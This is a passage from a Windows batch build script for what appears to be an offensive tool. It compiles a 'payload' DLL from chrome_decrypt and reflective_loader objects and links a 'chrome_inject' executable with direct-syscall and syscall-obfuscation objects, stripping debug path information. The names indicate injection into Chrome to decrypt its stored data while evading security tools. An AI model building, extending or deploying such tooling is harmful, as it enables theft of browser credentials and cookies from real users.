...
:check_environment
    ...
    if not defined DevEnvDir (
        call :log_info "Developer environment not detected. Initializing Visual Studio 2022 Professional..."
        if exist "C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvars64.bat" (
            call "C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvars64.bat" >nul 2>&1
            if %errorlevel% neq 0 (
                call :log_error "Failed to initialize Visual Studio environment."
                exit /b 1
            )
            call :log_success "Visual Studio 2022 Professional environment initialized."
        ) else (
            call :log_error "Visual Studio 2022 Professional not found at expected path."
            call :log_error "Please run this script from a Developer Command Prompt or install VS2022 Professional."
            exit /b 1
        )
    ) else (
...
:compile_payload
    ...
    set "CMD_STUB_ASM=ml64.exe /c /Fo"%BUILD_DIR%\chkstk_stub.obj" "%SRC_DIR%\chkstk_stub_x64.asm""
    call :run_command "%CMD_STUB_ASM%" "  - Assembling chkstk stub (x64)..."
    if %errorlevel% neq 0 exit /b 1
    ...
    set "CMD_LINK=link /NOLOGO /DLL /OUT:"%BUILD_DIR%\%PAYLOAD_DLL_NAME%" "%BUILD_DIR%\chrome_decrypt.obj" "%BUILD_DIR%\reflective_loader.obj" "%BUILD_DIR%\chkstk_stub.obj" "%BUILD_DIR%\sqlite3.lib" "%LIBS_DIR%\zstd\libzstd_static.lib" bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib /EXPORT:___chkstk_ms /IMPLIB:"%BUILD_DIR%\chrome_decrypt.lib""
...
:compile_injector
    ...
    set "CMD_LINK_FINAL=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% "%BUILD_DIR%\chrome_inject.obj" "%BUILD_DIR%\syscalls.obj" "%BUILD_DIR%\syscalls_obfuscation.obj" !TRAMPOLINE_OBJ! "%BUILD_DIR%\resource.res" version.lib shell32.lib advapi32.lib netapi32.lib user32.lib /link /NOLOGO /LTCG /OPT:REF /OPT:ICF /DYNAMICBASE /NXCOMPAT /EMITPOGOPHASEINFO /PDBALTPATH:none /NOCOFFGRPINFO /OUT:".\%FINAL_EXE_NAME%""
